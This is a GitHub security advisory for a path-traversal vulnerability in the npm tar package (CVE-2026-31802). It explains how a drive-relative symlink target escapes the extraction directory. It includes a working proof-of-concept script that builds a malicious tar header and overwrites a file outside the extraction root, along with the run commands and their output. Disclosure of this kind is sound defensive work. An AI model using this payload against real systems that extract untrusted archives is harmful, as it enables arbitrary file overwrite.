# [H] node-tar Symlink Path Traversal via Drive-Relative Linkpath

## Summary
Severity: High
Advisory: GHSA-9ppj-qmqm-q256
CVE: CVE-2026-31802
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N (CVSS_V4)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-9ppj-qmqm-q256
Type: github-advisory

## Affected
- npm: `tar` — affected >=0 <7.5.11

## Details
### Summary
`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details
The extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.

What happens with `linkpath: "C:../../../target.txt"`:
1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.
2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.
3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.
4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC
Tested on Arch Linux with `tar@7.5.10`.

PoC script (`poc.cjs`):

```js
const fs = require('fs')
const path = require('path')
const { Header, x } = require('tar')

const cwd = process.cwd()
const target = path.resolve(cwd, '..', 'target.txt')
const tarFile = path.join(cwd, 'poc.tar')

fs.writeFileSync(target, 'ORIGINAL\n')

const b = Buffer.alloc(1536)
new Header({
  path: 'a/b/l',
  type: 'SymbolicLink',
  linkpath: 'C:../../../target.txt',
}).encode(b, 0)
fs.writeFileSync(tarFile, b)

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\n')
  process.stdout.write(fs.readFileSync(target, 'utf8'))
})
```

Run:

```bash
node poc.cjs && readlink a/b/l && ls -l a/b/l ../target.txt
```

Observed output:

```text
PWNED
../../../target.txt
lrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -> ../../../target.txt
.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt
```

`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.

### Impact
This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:
- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files

## References
- https://github.com/isaacs/node-tar/security/advisories/GHSA-9ppj-qmqm-q256
- https://nvd.nist.gov/vuln/detail/CVE-2026-31802
- https://github.com/isaacs/node-tar/commit/f48b5fa3b7985ddab96dc0f2125a4ffc9911b6ad
- https://github.com/isaacs/node-tar
